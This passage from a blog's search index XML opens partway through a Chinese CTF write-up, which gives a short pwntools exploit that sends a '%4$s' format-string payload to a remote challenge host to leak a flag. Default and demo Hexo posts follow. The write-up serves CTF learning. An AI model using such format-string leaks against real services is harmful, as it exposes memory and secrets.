<h2><span id="exp如下">exp如下：</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(&#x27;./printFailed&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">28789</span>)</span><br><span class="line"> </span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(<span class="string">&quot;%4$s&quot;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">x = p.recvline()</span><br><span class="line">y = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">        y+=<span class="built_in">chr</span>(i-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(y)</span><br></pre></td></tr></table></figure>

<hr>
<h1><span id="总结">总结</span></h1><p>做这道格式化字符串漏洞的题，也算是给我开阔了自己的视野，还是要好好加强自己的能力，冲冲冲，干就完事了！！！</p>
<p><strong>Video Tutorial</strong>:
<a href="https://www.youtube.com/watch?v=gSLdg4mipYs%EF%BC%88%E6%AD%A4%E9%A2%98%E8%AE%B2%E8%A7%A3%E7%9A%84%E8%A7%86%E9%A2%91%EF%BC%89">https://www.youtube.com/watch?v=gSLdg4mipYs（此题讲解的视频）</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>SDCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<p>hello world</p>
<span id="more"></span>
<h2><span id="quick-start">Quick Start</span></h2><h3><span id="create-a-new-post">Create a new post</span></h3><pre><code>$ hexo new &quot;My New Post&quot;
</code></pre>
<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3><span id="run-server">Run server</span></h3><pre><code>$ hexo server
</code></pre>
<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3><span id="generate-static-files">Generate static files</span></h3><pre><code>$ hexo generate
</code></pre>
<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3><span id="deploy-to-remote-sites">Deploy to remote sites</span></h3><pre><code>$ hexo deploy
</code></pre>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>highlight-test</title>
    <url>/highlight-test/</url>
    <content><![CDATA[<p>高亮部分修改</p>
<span id="more"></span>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打印 Hello World 到终端</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello World&quot;</span>)  <span class="comment"># ✅ 输出语句</span></span><br></pre></td></tr></table></figure>

<p>啊啊啊</p>
]]></content>
  </entry>
  <entry>
    <title>简单的 Hexo 文章示例</title>
    <url>/%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<p>这是一篇非常简单的 Hexo 文章示例。</p>
<span id="more"></span>
<p>下面是一个常用的 Hexo 命令操作代码块：</p>
<pre><code>hexo clean
hexo generate
hexo server
</code></pre>
<p>你可以把这段代码复制到终端执行，启动你的 Hexo 本地服务器。</p>
<pre><code>askjdhfkj
asljndkflj
sljkdfkljd
</code></pre>
<p>你是真的帅</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 打印 Hello World 到终端</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello World\n&quot;</span>); <span class="comment">// 输出语句</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>知道吗
啊啊啊
你好熊之之</p>
]]></content>
      <tags>
        <tag>hexo</tag>
        <tag>demo</tag>
      </tags>
  </entry>
</search>
